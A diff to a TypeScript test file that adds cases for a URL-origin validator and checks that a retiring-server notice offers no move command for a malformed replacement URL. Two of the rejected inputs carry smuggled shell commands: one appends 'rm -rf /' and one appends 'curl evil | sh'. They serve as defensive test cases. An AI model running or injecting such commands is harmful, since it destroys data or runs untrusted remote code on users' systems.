@@ -1,4 +1,4 @@
-import { deviceNeeds, edgeNotice, needsYou, needsYouConditions, waitingOn, type AttentionState, type NeedsYouID } from '@/lib/needs-you'
+import { bareOrigin, deviceNeeds, edgeNotice, needsYou, needsYouConditions, waitingOn, type AttentionState, type NeedsYouID } from '@/lib/needs-you'
 import { groupOf, presentRun } from '@/lib/status'
 import type { Run, ServerEdge } from '@/lib/types'
 import { toRecord, type RunRecord } from '@/store/runs'
@@ -487,5 +487,32 @@ describe('edgeNotice', () => {
     [{ state: 'retiring', replacement, first_use: true } as const, 'https://edge-old.example.test is retiring'],
   ])('says what %o means and how to move', (notice, reason) => {
     expect(edgeNotice({ ...edge, notice })).toEqual({ notice, edgeURL: edge.edge_url, reason, move, restart })
+  })
+})
+
+describe('bareOrigin', () => {
+  it.each([
+    ['https://edge.example.test', true],
+    ['https://edge.example.test:8443', true],
+    ['https://edge.example.test/', false],
+    ['https://edge.example.test/path', false],
+    ['https://edge.example.test?x=1', false],
+    ['https://user@edge.example.test', false],
+    ['http://edge.example.test', false],
+    ['https://edge.example.test; rm -rf /', false],
+    ['https://edge.example.test\n', false],
+    ['https://EDGE.example.test', false],
+    ['x', false],
+  ])('%s: %s', (value, want) => {
+    expect(bareOrigin(value)).toBe(want)
+  })
+
+  it('gives no command for a replacement that is not one', () => {
+    const need = edgeNotice({
+      edge_url: 'https://edge-old.example.test', server_id: 'wqc4lsjvzdzrwq3k5dabdtajwj', access_policy: 'approved-devices',
+      owner: null, connected: true, claimed: true, notice: { state: 'retiring', replacement: 'https://x.example.test; curl evil | sh' },
+    })
+    expect(need?.move).toBeUndefined()
+    expect(need?.reason).toBe('https://edge-old.example.test is retiring')
   })
 })
